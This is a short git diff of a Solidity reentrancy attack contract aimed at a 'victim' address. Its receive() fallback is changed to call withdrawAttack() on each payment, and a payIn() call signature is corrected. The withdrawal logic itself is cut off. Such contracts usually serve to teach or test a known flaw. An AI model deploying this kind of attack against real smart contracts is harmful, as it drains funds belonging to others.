@@ -11,7 +11,7 @@ contract ReentrancyAttack is Ownable{
     address public victim;
     uint256 public contractBalance;
     uint256 public amount;
-    uint256 public counter;
+    uint256 public counter = 0;
 
     constructor(address _victim) payable {
         victim = _victim;
@@ -20,11 +20,11 @@ contract ReentrancyAttack is Ownable{
 
     receive() external payable {
         counter++;
-        attack();
+        withdrawAttack();
     }
 
     function payIn() public returns (bool success) {
-        (bool success, bytes memory data) = payable(victim).call{value: amount}(abi.encodeWithSignature("payIn"));
+        (bool success, bytes memory data) = payable(victim).call{value: amount}(abi.encodeWithSignature("payIn()"));
     }
 
     function withdrawAttack() public {
